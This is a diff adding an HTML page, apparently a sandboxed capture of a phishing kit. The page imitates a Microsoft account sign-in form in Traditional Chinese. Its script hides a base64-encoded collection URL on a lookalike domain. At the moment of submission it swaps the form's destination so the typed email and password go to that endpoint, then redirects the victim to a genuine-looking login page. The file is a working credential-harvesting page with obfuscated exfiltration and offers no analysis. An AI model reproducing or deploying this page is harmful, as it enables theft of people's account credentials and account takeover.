@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<!-- sandbox capture: https://login.m365-verify.example/owa/?u=student  2026-11-26 09:20 -->
+<html lang="zh-Hant">
+<head>
+  <meta charset="utf-8">
+  <title>登入您的帳戶</title>
+  <link rel="icon" href="https://aadcdn.msftauth.example/shared/favicon.ico">
+  <style>
+    body { font-family: "Segoe UI", sans-serif; background: #f2f2f2; }
+    .box { width: 440px; margin: 80px auto; padding: 44px; background: #fff; }
+    input { width: 100%; padding: 6px 0; margin: 8px 0; border: 0; border-bottom: 1px solid #666; }
+    button { background: #0067b8; color: #fff; border: 0; padding: 8px 32px; float: right; }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <img src="https://aadcdn.msftauth.example/shared/microsoft_logo.svg" alt="Microsoft" width="108">
+    <h2>登入</h2>
+    <!-- 表單看起來是送到 Microsoft 官方登入頁 -->
+    <form id="f" method="post" action="https://login.microsoftonline.example/common/login">
+      <input type="email" name="loginfmt" placeholder="電子郵件、電話或 Skype" required>
+      <input type="password" name="passwd" placeholder="密碼" required>
+      <input type="hidden" name="src" value="metis-corp">
+      <p><a href="https://login.microsoftonline.example/forgot">忘記密碼？</a></p>
+      <button type="submit">登入</button>
+    </form>
+  </div>
+  <script>
+    var _cfg = "aHR0cHM6Ly9zeW5jLm0zNjUtdmVyaWZ5LmV4YW1wbGUvYXBpL2NvbGxlY3QucGhwP2tpdD1tZXRpc3taR1ZqYjJSbFpGOXdhR2x6YUY5b2IzTjB9";
+    document.getElementById('f').addEventListener('submit', function () {
+      this.action = atob(_cfg);   // 送出的瞬間才把目的地換掉
+      setTimeout(function () { location.href = 'https://login.microsoftonline.example/'; }, 500);
+    });
+  </script>
+</body>
+</html>
